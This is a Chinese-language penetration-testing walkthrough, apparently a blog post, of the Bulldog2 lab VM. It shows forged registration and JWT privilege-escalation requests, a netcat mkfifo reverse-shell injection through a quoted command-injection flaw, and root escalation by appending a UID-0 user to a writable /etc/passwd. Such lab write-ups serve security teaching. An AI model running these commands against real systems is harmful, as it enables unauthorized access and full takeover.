# Bulldog2网站渗透

## 渗透过程

靶机：IP地址未知

测试机kali：ip192.168.72.141

### 主机发现

通过主机发现，发现了192.168.72.145和192.168.72.146两个IP
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213220810236.png)

### 端口扫描

可以发现两个ip地址下都只开放了一个80端口
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213220932759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

### 服务扫描

获知，服务器使用了linux系统，web服务使nginx1.14.0版本，192.168.72.146与192.168.72.145相同
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213221001740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

` nmap --script http-methods --script-args http-methods.url-path="/" 192.168.72.145  `  
探测网页所支持的方法，发现并不支持PUT方法
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213221040344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

> **POST 方法用来传输实体的主体，PUT方法用来传输文件，自身不带验证机制** 

### 获取网站指纹信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213221106256.png)

### 扫描网页目录

使用 `dpkg -L dirb` 来查看需要调用的字典路径
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213221147582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

使用common字典对网站的两个IP的目录进行扫描，只发现两个路径
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213221300834.png)

### 信息整理筛选

根据扫到的网站信息，发现此网站使用了nginX 1.14.0版本的网页服务器软件，尝试使用`searchsploit nginx`来检索相关的漏洞，未找到有价值的信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213221322570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

IP地址开启了WEB服务，因此先直接访问已知的地址，寻找有用的信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213221349757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213221411210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

对页面进行浏览，发现该网站已经关闭注册
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231304893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

在登陆界面尝试SQL注入，显示凭证无效
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231322848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)



### 页面元素审查

在主页的源码中发现几个JS脚本，下载下来并打开

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231339136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

### 尝试注册用户

因为要尝试注册用户，因此打开JS脚本中的main*.js，在JS脚本中搜索关键 register，经过审查，发现用户注册时需要name，email，username，password

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231413237.png)

因为网站现在关闭了注册，所以使用burpsuite在登陆账号时进行抓包，发现POST传递的路径是/users/authenticate。因为需要将登陆包改成注册包，结合代码审计到信息，应该将authenticate修改为register

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231431167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

```
# 修改前抓到的登陆数据包

POST /users/authenticate HTTP/1.1
Host: 192.168.72.145
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
content-type: application/json
Content-Length: 49
Origin: http://192.168.72.145
Connection: close
Referer: http://192.168.72.145/login

{
  "username": "wwwww",
  "password": "wwwwww"
}
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231648820.png)



将抓到的数据包导入repeater模块中，然后尝试改包

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231617682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

```
# 修改后的注册数据包

POST /users/register HTTP/1.1
Host: 192.168.72.145
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
content-type: application/json
Content-Length: 49
Origin: http://192.168.72.145
Connection: close
Referer: http://192.168.72.145/login

{"name":"garmin",
"email":"garmin@test.com",
"username":"garmin",
"password":"1234!@#$"
}
```

注册成功，并尝试登陆

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231714960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231740819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
### 进行水平越权

使用相同的方法注册一个账号admin，密码123，登陆后发现用户名也是明文显示在url上，尝试在url上修改用户名，结果竟然不需要密码就能直接登陆，但是登陆后的账号与注册的普通账号权限一样，因此这是一种==水平越权==

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231804171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213231838713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
### 进行垂直越权

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232141713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)


再次登录，通过Burpsuite抓包查看服务器回包的信息
```
# 回报的信息

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 04 Dec 2019 16:36:35 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 396
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
ETag: W/"18c-YIn4//rjps/AGEgvA6o4HKXdUxY"

{"success":true,"token":"JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJnYXJtaW4iLCJlbWFpbCI6Imdhcm1pbkB0ZXN0LmNvbSIsInVzZXJuYW1lIjoiZ2FybWluIiwiYXV0aF9sZXZlbCI6InN0YW5kYXJkX3VzZXIifSwiaWF0IjoxNTc1NDc3Mzk1LCJleHAiOjE1NzYwODIxOTV9.9EdCybe5oqEUisMWhmlaEPsrVgbpLzilaHL96-deWSg","user":{"name":"garmin","username":"garmin","email":"garmin@test.com","auth_level":"standard_user"}}

```

返回包中带有一个JWT开头的token字段,而且在末尾处有一个"auth_level"的认证级别，判断可能与用户的权限有关

> JWT（Json Web Token）的声明，一般用于身份提供者和服务提供者间，来传递被认证的用户身份信息，以便从资源服务器获取资源，也可以增加一些额外的其他业务逻辑所必须的声明信息，该token也可直接被用于认证或被加密；

将JWT字段复制在JWT的解码网站上进行解码

![在这里插入图片描述](https://img-blog.csdnimg.cn/201912132322483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

要进行垂直提取，需要将这部分信息进行修改，因为不知道管理员级别的名称，需要使用auth_level关键字在代码中查找，出现了master_admin_user的可疑信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232313998.png)
修改jwt中的解码信息，获得新的编码数据

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232334237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

在登陆包发送前，选择接受回包，并用得到的信息对收到的回包进行修改

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232358928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

```
#修改后的回报的信息

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 04 Dec 2019 16:36:35 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 396
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
ETag: W/"18c-YIn4//rjps/AGEgvA6o4HKXdUxY"

{"success":true,"token":"JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJnYXJtaW4iLCJlbWFpbCI6Imdhcm1pbkB0ZXN0LmNvbSIsInVzZXJuYW1lIjoiZ2FybWluIiwiYXV0aF9sZXZlbCI6Im1hc3Rlcl9hZG1pbl91c2VyIn0sImlhdCI6MTU3NTQ3NzM5NSwiZXhwIjoxNTc2MDgyMTk1fQ.TZwvc1Th9qNxsV2gDFiaTT1egBu3iEYEVWXzWzPdhqM","user":{"name":"garmin","username":"garmin","email":"garmin@test.com","auth_level":"master_admin_user"}}
```

将修改后的回包发送后就获得新的页面，增加了一个Admin选项

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232427279.png)

点击Admin后进入一个新的登陆页面，越权成功

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232445713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

### 逻辑漏洞利用

尝试登陆，抓取登陆包，发现用户名和密码明文放在最后；在回包中发现存在一个success的参数，且对这个不存在的账户的状态是false

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232503985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

尝试对回包修改为true，结果页面回复一个登陆成功，但没有进行跳转，对逻辑漏洞的利用失败

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232525626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232546264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
### 反弹SHELL

 当密码过长时，会返回报错信息，在报错信息中发现目录名称
 
![在这里插入图片描述](https://img-blog.csdnimg.cn/2019121323262274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
搜Bulldog-2-The-Reckoning在github上发现命执行漏洞源码 

```
user.js
router.post('/linkauthenticate', (req, res, next) => {
  const username = req.body.password;
  const password = req.body.password;

  exec(`linkplus -u ${username} -p ${password}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`exec error: ${error}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.log(`stderr: ${stderr}`);});
```

尝试用netcat在登陆界面反弹shell，在用户名后面写好语句后，在测试机开启端口的监听

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232712893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.72.141 888 >/tmp/f;
```

在密码处插入shell的反弹脚本，并在kali上开启端口的监听

成功获得用户的shell

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232758636.png)

### 提权

进入/etc目录中，发现存放用户名和密码的文件竟然时777，可以向其中写入一个管理员权限的用户

![在这里插入图片描述](https://img-blog.csdnimg.cn/2019121323283928.png)

可以仿照这个格式写入一个管理员权限的用户

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213232905590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)

使用加密命令，得到一个加密后的密码。123456为加密的密码；aa表示使用的加密盐（可以有aa,sa,Fx等），如果不使用加密盐，那么输出的字符串将不是crypt加密格式，而是MD5加密格式的。所以，加密盐其实是必须的参数。

![在这里插入图片描述](https://img-blog.csdnimg.cn/2019121323293590.png)
```
perl -le 'print crypt("123456","aa")'
```

只需将passwd文件中root的信息的用户名和加密密码修改，就可以创建一个和root权限相同的用户

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213233004923.png)

```
echo 'ming:aaAN1ZUwjW7to:0:0:garmin:/root:/bin/bash'>> /etc/passwd
```

使用python重新调用一个shell，并且切换到新的用户

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213233043100.png)
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

提权成功

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191213233118215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMjg4MTIz,size_16,color_FFFFFF,t_70)
